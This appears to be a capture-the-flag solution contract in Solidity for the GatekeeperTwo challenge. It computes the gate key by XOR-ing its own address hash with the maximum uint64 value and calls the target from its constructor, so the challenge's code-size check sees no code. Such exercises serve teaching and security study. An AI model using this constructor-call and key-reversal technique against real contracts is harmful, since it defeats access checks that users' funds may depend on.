// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/GatekeeperTwo.sol';

contract HackGatekeeperTwo {
    GatekeeperTwo originalContract;
    // XOR operator ^ is easily reversible
    // We need to use the previous result as the second value so we obtain the previous second value
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

    // To pass the second gate, we need to our address not to have any code
    // When we're creating the contract, there's still no code in the contract's address
    // Executing the function into the contractor is out way to bypass the second gate
    constructor(address _contract) {
        originalContract = GatekeeperTwo(_contract);
        originalContract.enter(key);
    }
}